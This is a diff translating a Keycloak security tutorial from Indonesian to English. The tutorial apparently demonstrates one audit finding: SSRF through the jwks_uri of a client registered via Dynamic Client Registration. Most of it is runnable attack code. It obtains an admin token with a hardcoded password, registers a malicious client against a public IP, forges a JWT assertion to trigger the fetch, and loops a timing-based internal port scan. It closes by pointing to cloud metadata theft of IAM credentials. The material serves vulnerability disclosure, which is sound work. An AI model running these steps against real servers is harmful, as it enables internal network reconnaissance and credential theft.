@@ -1,24 +1,24 @@
 # Tutorial: Finding #6 — SSRF via DCR jwks_uri
 
 **Severity:** MEDIUM (CVSS 6.5)
-**Waktu demo:** ~8 menit
-**Kebutuhan:** 2 Terminal
+**Demo time:** ~8 minutes
+**Requirements:** 2 Terminals
 
 ---
 
-## Skenario Serangan
+## Attack Scenario
 
-Attacker dengan role `create-client` register OIDC client via DCR dengan `jwks_uri` mengarah ke alamat internal. Saat JWT authentication di-trigger, Keycloak fetch URL tersebut — SSRF!
+An attacker with the `create-client` role registers an OIDC client via DCR with a `jwks_uri` pointing to an internal address. When JWT authentication is triggered, Keycloak fetches that URL — SSRF!
 
 ---
 
-## Langkah 0: Pastikan Keycloak Berjalan dan testuser Punya create-client Role
+## Step 0: Ensure Keycloak is Running and testuser Has the create-client Role
 
 ```bash
 curl -s http://localhost:8080/realms/test | python3 -c "import sys,json; print('Keycloak OK:', json.load(sys.stdin)['realm'])"
 ```
 
-Setup role jika belum (sama seperti Finding #5):
+Set up the role if not already done (same as Finding #5):
 ```bash
 ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
   -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
@@ -44,7 +44,7 @@ curl -s -o /dev/null -w "Assign role: HTTP %{http_code}\n" -X POST \
 
 ---
 
-## Langkah 1: (ATTACKER) Login sebagai testuser
+## Step 1: (ATTACKER) Login as testuser
 
 ```bash
 ATTACKER_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
@@ -60,9 +60,9 @@ echo "Attacker token: ${ATTACKER_TOKEN:0:40}..."
 
 ---
 
-## Langkah 2: Siapkan HTTP Listener (Terminal 1)
+## Step 2: Set Up HTTP Listener (Terminal 1)
 
-Buka terminal baru — ini akan menangkap SSRF request dari Keycloak:
+Open a new terminal — this will capture the SSRF request from Keycloak:
 
 ```bash
 python3 -c "
@@ -70,7 +70,7 @@ from http.server import HTTPServer, BaseHTTPRequestHandler
 class H(BaseHTTPRequestHandler):
     def do_GET(self):
         print(f'')
-        print(f'=== SSRF via JWKS_URI TERDETEKSI! ===')
+        print(f'=== SSRF via JWKS_URI DETECTED! ===')
         print(f'Method:     {self.command}')
         print(f'Path:       {self.path}')
         print(f'Host:       {self.headers.get(\"Host\")}')
@@ -82,15 +82,15 @@ class H(BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(b'{\"keys\":[]}')
     def log_message(self, *a): pass
-print('Listener siap di port 49997...')
-print('Menunggu Keycloak fetch jwks_uri...')
+print('Listener ready on port 49997...')
+print('Waiting for Keycloak to fetch jwks_uri...')
 HTTPServer(('0.0.0.0', 49997), H).serve_forever()
 "
 ```
 
 ---
 
-## Langkah 3: (ATTACKER) Register DCR Client dengan jwks_uri Internal (Terminal 2)
+## Step 3: (ATTACKER) Register DCR Client with Internal jwks_uri (Terminal 2)
 
 ```bash
 DCR_RESP=$(curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
@@ -108,7 +108,7 @@ DCR_RESP=$(curl -s -X POST http://46.101.162.187:8080/realms/test/clients-regist
 echo "$DCR_RESP" | python3 -c "
 import sys,json
 d = json.load(sys.stdin)
-print('=== DCR CLIENT TERDAFTAR ===')
+print('=== DCR CLIENT REGISTERED ===')
 print(f'Client ID:  {d.get(\"client_id\")}')
 print(f'jwks_uri:   http://46.101.162.187:49997/internal-jwks')
 print(f'Auth method: private_key_jwt')
@@ -119,13 +119,13 @@ CLIENT_ID=$(echo "$DCR_RESP" | python3 -c "import sys,json; print(json.load(sys.
 echo "Client ID: $CLIENT_ID"
 ```
 
-> **jwks_uri diterima tanpa validasi!** Keycloak tidak cek apakah URL tersebut internal/private.
+> **jwks_uri accepted without validation!** Keycloak does not check whether the URL is internal/private.
 
 ---
 
-## Langkah 4: Buat JWT Client Assertion
+## Step 4: Create JWT Client Assertion
 
-JWT ini akan memaksa Keycloak fetch `jwks_uri` untuk validasi signature:
+This JWT will force Keycloak to fetch `jwks_uri` to validate the signature:
 
 ```bash
 JWT_HEADER=$(echo -n '{"alg":"RS256","kid":"test-key"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
@@ -149,9 +149,9 @@ echo "JWT assertion: ${JWT:0:60}..."
 
 ---
 
-## Langkah 5: Trigger SSRF!
+## Step 5: Trigger SSRF!
 
-Kirim request ke token endpoint dengan JWT assertion — Keycloak akan fetch jwks_uri untuk verifikasi:
+Send a request to the token endpoint with the JWT assertion — Keycloak will fetch jwks_uri for verification:
 
 ```bash
 curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
@@ -170,15 +170,15 @@ curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/t
 }
 ```
 
-> Error "Unable to load public key" membuktikan Keycloak **mencoba fetch jwks_uri** dan mendapat `{"keys":[]}` (tidak ada key yang cocok).
+> The error "Unable to load public key" proves that Keycloak **tried to fetch jwks_uri** and received `{"keys":[]}` (no matching key).
 
 ---
 
-## Langkah 6: Lihat Listener (Terminal 1)
+## Step 6: Check Listener (Terminal 1)
 
-**Output di listener:**
+**Output on the listener:**
 ```
-=== SSRF via JWKS_URI TERDETEKSI! ===
+=== SSRF via JWKS_URI DETECTED! ===
 Method:     GET
 Path:       /internal-jwks
 Host:       46.101.162.187:49997
@@ -186,20 +186,20 @@ User-Agent: Apache-HttpClient/4.5.14 (Java/21.0.10)
 =====================================
 ```
 
-> **SSRF CONFIRMED!** Keycloak melakukan server-side HTTP GET ke alamat yang attacker tentukan!
+> **SSRF CONFIRMED!** Keycloak performed a server-side HTTP GET to an address specified by the attacker!
 
 ---
 
-## Langkah 7: Demo Port Scanning via SSRF
+## Step 7: Demo Port Scanning via SSRF
 
-Attacker bisa scan port internal berdasarkan timing response:
+The attacker can scan internal ports based on response timing:
 
 ```bash
 echo "=== Port Scanning via SSRF ==="
 echo ""
 
 for TARGET in "127.0.0.1:8080" "127.0.0.1:22" "127.0.0.1:3306" "127.0.0.1:9999"; do
-  # Register client untuk setiap target
+  # Register a client for each target
   SCAN_RESP=$(curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
     -H "Authorization: Bearer $ATTACKER_TOKEN" \
     -H "Content-Type: application/json" \
@@ -214,7 +214,7 @@ for TARGET in "127.0.0.1:8080" "127.0.0.1:22" "127.0.0.1:3306" "127.0.0.1:9999";
   SCAN_ID=$(echo "$SCAN_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('client_id','ERROR'))" 2>/dev/null)
 
   if [ "$SCAN_ID" != "ERROR" ]; then
-    # Trigger fetch dan ukur waktu
+    # Trigger fetch and measure timing
     START=$(date +%s%3N)
     curl -s -o /dev/null -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
       -d "client_id=$SCAN_ID&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJ0ZXN0In0.fake" 2>/dev/null
@@ -225,11 +225,11 @@ for TARGET in "127.0.0.1:8080" "127.0.0.1:22" "127.0.0.1:3306" "127.0.0.1:9999";
 done
 
 echo ""
-echo "Port terbuka: response cepat"
-echo "Port tertutup: response lambat (timeout)"
+echo "Open port: fast response"
+echo "Closed port: slow response (timeout)"
 ```
 
-**Output contoh:**
+**Example output:**
 ```
 === Port Scanning via SSRF ===
 
@@ -241,7 +241,7 @@ echo "Port tertutup: response lambat (timeout)"
 
 ---
 
-## Langkah 8: Jalankan Python PoC (Otomatis Semua)
+## Step 8: Run Python PoC (Fully Automated)
 
 ```bash
 python3 pocs/poc_f6_dcr_jwks_ssrf.py --host http://localhost:8080 --listen-port 49997
@@ -249,19 +249,19 @@ python3 pocs/poc_f6_dcr_jwks_ssrf.py --host http://localhost:8080 --listen-port 
 
 ---
 
-## Ringkasan
+## Summary
 
-| Test | Hasil | Status |
+| Test | Result | Status |
 |---|---|---|
-| Register DCR client dengan jwks_uri internal | Diterima tanpa validasi | VULNERABLE |
-| Trigger JWKS fetch via JWT assertion | Keycloak fetch URL | VULNERABLE |
-| Port scanning via timing | Port terbuka vs tertutup terlihat jelas | VULNERABLE |
+| Register DCR client with internal jwks_uri | Accepted without validation | VULNERABLE |
+| Trigger JWKS fetch via JWT assertion | Keycloak fetches URL | VULNERABLE |
+| Port scanning via timing | Open vs closed ports clearly distinguishable | VULNERABLE |
 
-**Perbandingan dengan Finding #4:**
+**Comparison with Finding #4:**
 | | Finding #4 (IdP SSRF) | Finding #6 (DCR SSRF) |
 |---|---|---|
-| Role yang dibutuhkan | `manage-identity-providers` (admin-level) | `create-client` (lebih rendah) |
+| Required role | `manage-identity-providers` (admin-level) | `create-client` (lower privilege) |
 | HTTP method | GET + POST | GET |
-| Trigger | Langsung via admin API | DCR + JWT authentication |
+| Trigger | Directly via admin API | DCR + JWT authentication |
 
-**Kesimpulan:** User dengan role `create-client` bisa melakukan SSRF untuk scan jaringan internal, termasuk akses cloud metadata endpoint (`169.254.169.254`) untuk mencuri IAM credentials.
+**Conclusion:** A user with the `create-client` role can perform SSRF to scan internal networks, including accessing cloud metadata endpoints (`169.254.169.254`) to steal IAM credentials.
